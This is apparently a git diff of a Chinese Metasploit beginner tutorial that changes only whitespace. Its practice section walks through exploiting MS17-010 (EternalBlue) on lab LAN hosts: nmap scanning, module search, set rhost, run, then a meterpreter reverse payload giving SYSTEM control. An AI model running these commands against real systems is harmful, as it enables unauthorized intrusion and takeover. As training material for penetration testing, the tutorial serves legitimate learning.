@@ -431,28 +431,28 @@ webcam_stream-开始摄像监控
 当然这些命令不是都能成功执行的，好多会被杀软查杀，还有好多需要系统权限，这个后面的meterpreter后渗透专题会继续深入。  
 ### 3.6实战练习
 上文介绍了metasploit大体的结构和简单的用法，现在我们利用所学的知识对一台有漏洞的主机进行测试攻击：
-任务：已知局域网中的几台主机都存在ms17010漏洞，请利用msf进行攻击！！
+任务：已知局域网中的几台主机都存在ms17010漏洞，请利用msf进行攻击！！  
 首先用nmap对机房局域网进行了扫描(当然可以利用msf的辅助模块进行扫描的）：  
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片47.png) 
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片48.png) 
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片47.png)  
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片48.png)  
 可以看出，开了445端口的主机都存在漏洞，现在对192.168.1.35这台主机进行攻击，当然局域网中的主机都存在漏洞是已知条件，如果不知道主机是否存在ms17010这个漏洞，需要先利用辅助模块中的的auxiliary/scanner/smb/smb_ms17_010来检验是否存在漏洞。此步先跳过。  
 ![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片49.png)  
-比如我们现在要使用ms17010的exp，就搜索：
-Search cve：2017 type：exploit platform：windows
+比如我们现在要使用ms17010的exp，就搜索：  
+Search cve：2017 type：exploit platform：windows  
 结果如下图所示，找到了ms17010的对应模块：  
 ![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片50.png)  
-完整图在下面：  
+完整图在下面：    
 ![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片51.png)  
-利用ms17010对win7主机实施入侵：
-上面我们找到了ms17010的攻击模块，那就直接来用吧！
+利用ms17010对win7主机实施入侵：  
+上面我们找到了ms17010的攻击模块，那就直接来用吧！  
 命令：use exploit/windows/smb/ms17_010_eternalblue（命令输入时可按tab快速填充）  
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片52.png) 
-现在已经进入了exploit攻击模块，先查看一下设置项：
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片52.png)  
+现在已经进入了exploit攻击模块，先查看一下设置项：  
 Show options  
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片53.png) 
-这里有一些参数不用管，只需要知道rhost填写目标ip地址就行。
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片53.png)   
+这里有一些参数不用管，只需要知道rhost填写目标ip地址就行。  
 命令：set rhost 目标ip  
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片54.png) 
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片54.png)  
 然后在输入命令：run或exploit就行啦！  
 ![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片55.png)  
 可以看到返回了目标机的cmd shell而且权限很高，因为这个攻击模块将dll链接文件注入到windows里面的spoolsv.exe进程，这是一个系统进程,所以得到的是系统权限。因为在刚才的参数设置是没有设置payload（攻击荷载），msf会默认一个shell，即bind_shell，但是bind_shell支持的命令有限，实现的功能有限，且不方便。所以，我们换meterpreter荷载来进一步攻击。
@@ -464,8 +464,8 @@ set lhost 本地ip地址
 set lport 本地监听地址（可不填，默认为4444）
 run（exploit）
 ```  
-![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片56.png) 
-可以看出攻击成功，可以完全的控制目标主机了。
+![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片56.png)  
+可以看出攻击成功，可以完全的控制目标主机了。  
 在meterpreter会话中执行ifconfig查看目标主机ip：  
 ![实战练习](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片57.png) 
 这只是一次很简单的利用metasploit框架进行的渗透测试，算是基础中的基础了，掌握了这些才是踏过metasploit的初级门槛，真正的实际用法和高级用法以后会讲到。  
